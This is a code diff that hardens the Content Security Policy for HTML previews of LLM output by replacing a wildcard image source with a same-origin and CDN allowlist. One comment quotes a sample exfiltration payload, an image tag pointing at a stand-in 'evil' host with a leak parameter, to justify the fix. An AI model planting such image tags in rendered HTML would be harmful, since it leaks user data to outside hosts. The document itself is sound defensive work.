@@ -32,10 +32,14 @@ export function buildHtmlPreviewCsp(
     `script-src 'unsafe-inline' ${cdnList}`,
     `style-src 'unsafe-inline' ${cdnList}`,
     `font-src ${cdnList}`,
-    // Images: lenient. Covers /api/files/raw (via wildcard), data
-    // URIs for inline PNGs, blob: for dynamically-generated charts,
-    // and any external https image.
-    "img-src * data: blob:",
+    // Images: same-origin (workspace files via /api/files/raw), CDN
+    // whitelist, plus data: and blob: for inline PNGs and dynamically-
+    // generated charts. Wildcard is deliberately avoided — an attacker
+    // who plants an <img src="https://evil/?leak="> in preview HTML
+    // could exfiltrate data via image requests even with connect-src
+    // blocked. Widen via HTML_PREVIEW_CSP_ALLOWED_CDNS if LLM output
+    // legitimately needs more hosts.
+    `img-src 'self' ${cdnList} data: blob:`,
     // Block XHR / fetch / WebSocket so previews can't phone home or
     // exfiltrate anything the inline scripts happen to compute.
     "connect-src 'none'",
